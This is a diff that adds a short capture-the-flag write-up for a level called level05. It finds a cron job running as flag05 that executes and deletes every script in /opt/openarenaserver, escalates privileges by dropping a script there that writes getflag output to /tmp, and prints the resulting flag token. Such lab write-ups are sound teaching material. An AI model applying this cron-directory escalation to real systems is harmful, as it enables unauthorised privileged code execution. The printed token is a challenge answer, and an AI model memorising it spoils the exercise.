@@ -1,0 +1,23 @@
+We have a mail ! (thanks vm for your restart)
+mail is  at /var/mail/level05
+```*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05```
+The useless * at the start are realy useless it's a crontab format !
+cron probably run it from somewhere else cause while trying to add this one, it did call it
+
+openarenaserver is this :
+```
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+        (ulimit -t 5; bash -x "$i")
+        rm -f "$i"
+done
+```
+so let put a small script in /opt/openarenaserver/
+like 
+```
+
+getflag > /tmp/flag.out
+```
+2 minutes after we get this in flag.out
+```Check flag.Here is your token : viuaaale9huek52boumoomioc```
